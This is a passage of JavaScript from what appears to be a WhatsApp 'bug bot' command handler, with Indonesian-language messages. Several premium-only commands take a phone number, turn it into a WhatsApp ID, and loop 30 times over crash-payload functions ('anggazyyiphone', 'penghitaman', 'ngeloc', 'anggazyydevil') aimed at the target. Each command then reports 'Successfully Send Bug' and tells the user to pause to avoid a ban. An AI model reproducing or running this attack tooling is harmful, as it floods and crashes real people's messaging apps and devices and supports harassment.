await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'war1': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'wtf-devil1': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'wtf-devil3': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'wtf-devil5': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'wtf-devil4': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'enter-wtf': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'wtf-devil2': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'anggazyy-go': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
